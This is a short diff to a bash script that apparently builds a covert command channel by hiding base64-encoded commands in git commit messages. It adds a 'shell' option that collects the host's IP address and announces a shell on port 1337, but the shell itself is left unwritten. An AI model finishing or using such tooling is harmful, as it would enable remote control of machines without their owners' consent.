@@ -3,7 +3,7 @@
 execute () {
 	encode=$(echo $1 | base64)
 	echo ${encode}
-    	touch $(cat /dev/urandom | env LC_CTYPE=C tr -dc 'a-zA-Z0-9' | fold -w ${1:-32} | head -n 1)
+    	touch $(cat /dev/urandom | env LC_CTYPE=C tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)
 	git add . > /dev/null
     	git commit -m ${encode} > /dev/null
     	#This is the best I could come up with
@@ -20,7 +20,8 @@ while true; do
     	clear
     elif [ $command = "shell" ]
 	then
-	    # gather ip
+	    # gather ip(for unix)
+	    addr=$(ip -o -4 -br a | grep "UP" | awk '{print $3}' | sed 's/.\{3\}$//')
 	    echo "spawing a shell on port 1337"
 	    # write a fucntion 
     elif [ $command = "exit" ]
